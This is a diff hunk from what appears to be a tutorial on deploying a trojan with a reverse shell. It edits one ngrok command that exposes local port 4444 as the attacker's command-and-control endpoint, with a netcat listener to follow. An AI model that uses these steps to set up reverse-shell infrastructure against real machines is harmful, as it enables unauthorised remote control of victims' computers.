@@ -88,7 +88,7 @@ Now that we have our trojan ready to go lets fire up our command and control cen
 If you have ngrok installed please run the following command to start the service:
 
 ```
-ngrok tcp 4444
+./ngrok tcp 4444
 ```
 This instructs ngrok to forward all traffic to port 4444 on your local machine. You can alternatively specify a different device's IP and Port on your local network if you would prefer.
 Because this is a reverse shell using standard tcp, we will need a listener such as netcat, fire it up with the following command:
